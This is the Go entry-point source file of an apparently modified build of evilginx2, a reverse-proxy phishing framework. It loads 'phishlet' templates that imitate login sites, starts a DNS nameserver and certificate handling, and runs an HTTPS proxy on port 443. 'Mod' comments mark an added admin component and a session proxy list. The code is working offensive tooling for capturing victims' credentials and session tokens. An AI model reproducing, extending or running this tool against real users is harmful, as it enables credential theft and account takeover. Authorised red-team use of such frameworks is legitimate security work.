package main

import (
	"flag"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

var (
	phishlets_dir  = flag.String("p", "./phishlets", "Phishlets directory path")
	templates_dir  = flag.String("t", "", "HTML templates directory path")
	debug_log      = flag.Bool("debug", false, "Enable debug output")
	developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
	cfg_dir        = flag.String("c", "./config", "Configuration directory path")
)

func joinPath(base_path, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

// func init() {
// 	if _, has := launcher.LookPath(); !has {
// 		log.Warning("Google Chrome/Chromium not found. Please install it.\nInstall guide: https://github.com/go-rod/go-rod.github.io/blob/master/compatibility.md")
// 		os.Exit(1)
// 	}
// }

func main() {
	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	flag.Parse()
	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *templates_dir == "" {
		*templates_dir = joinPath(exe_dir, "./templates")
		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
			*templates_dir = "/usr/share/evilginx/templates/"
			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
				*templates_dir = joinPath(exe_dir, "./templates")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
		err = os.MkdirAll(*templates_dir, os.FileMode(0o700))
		if err != nil {
			log.Error("creating dir: %v", err)
		}
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0o700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	if err := core.CreateDir(crt_path, 0o700); err != nil { //nolint:gocritic // false positive
		log.Fatal("mkdir: %v", err)
		return
	}

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetTemplatesDir(*templates_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}
	// Mod
	core.NewAdmin(db, cfg, *cfg_dir)

	proxies := []string{}
	if cfg.GetSessionProxy() {
		proxies = core.ReadProxyList(*cfg_dir)
	}
	// End mod

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		pr := regexp.MustCompile(`([a-zA-Z0-9\-.]*)\.yaml`)
		rpname := pr.FindStringSubmatch(f.Name())
		if rpname == nil || len(rpname) < 2 {
			continue
		}
		pname := rpname[1]
		if pname != "" {
			pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
			if err != nil {
				log.Error("failed to load phishlet '%s': %v", f.Name(), err)
				continue
			}
			cfg.AddPhishlet(pname, pl)
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()
	hs, _ := core.NewHttpServer()
	hs.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, proxies, *developer_mode)
	err = hp.Start()
	if err != nil {
		log.Fatal("http proxy: %v", err)
		return
	}

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
